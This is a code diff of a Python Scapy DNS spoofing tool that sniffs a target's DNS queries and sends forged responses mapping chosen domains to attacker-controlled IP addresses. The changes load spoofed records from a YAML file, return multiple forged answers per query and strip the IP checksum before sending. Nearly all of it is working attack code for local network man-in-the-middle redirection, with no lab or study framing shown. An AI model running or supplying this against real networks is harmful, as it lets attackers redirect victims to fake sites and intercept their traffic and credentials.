@@ -4,7 +4,8 @@ from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, sendp, Ether, get_if_hw
 import sys
 import os
 import time
-from modules.helpers import get_mac
+import yaml
+
 
 class DNSSpoofer:
     def __init__(self, interface, target_ip, gateway_ip):
@@ -23,6 +24,21 @@ class DNSSpoofer:
 
         self.spoofed_packet = set()
 
+        self.config()
+
+    def config(self):
+        try:
+            with open('config/dns_list.yml', 'r') as file:
+                dns_config = yaml.safe_load(file)
+                self.dns_records = dns_config
+                print("[+] Successfully loaded DNS configuration")
+        except FileNotFoundError:
+            print("[!] DNS configuration file not found at config/dns_list.yml")
+            sys.exit(1)
+        except yaml.YAMLError as e:
+            print(f"[!] Error parsing DNS configuration: {e}")
+            sys.exit(1)
+
     def handle_dns_request(self, pkt):
         # Extract domain name from DNSQR
         domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
@@ -31,7 +47,7 @@ class DNSSpoofer:
             # Check if we have a spoofed record for this domain
             spoofed_ip = self.dns_records[domain]
             # Create DNS response packet
-            answers = [DNSRR(rrname=pkt[DNSQR].qname, rdata=spoofed_ip, ttl=60)] * 6
+            answers = [DNSRR(rrname=pkt[DNSQR].qname, rdata=ip, ttl=60) for ip in spoofed_ip]
             
             dns_response = Ether(dst=pkt[Ether].src, src=pkt[Ether].dst) / \
                             IP(dst=pkt[IP].src, src=pkt[IP].dst, flags="DF") / \
@@ -42,9 +58,12 @@ class DNSSpoofer:
                                 an=answers)
 
             # Send the spoofed response
+
+            del dns_response[IP].chksum
+            
             sendp(dns_response, iface=self.interface, verbose=False)
             self.spoofed_packet.add(packet_id)
-            print(f"[+] Sent spoofed DNS response to packet {packet_id} for {domain}")
+            print(f"[+] Sent spoofed DNS response to packet {hex(packet_id)} for {domain}")
 
     def start(self):
         self.spoofing = True
@@ -80,4 +99,6 @@ if __name__ == "__main__":
     # Dictionary of domains to spoof and their fake IP addresses
 
     spoofer = DNSSpoofer(interface, target_ip, gateway_ip)
-    spoofer.start()
+    spoofer.config()
+
+    print(spoofer.dns_records)
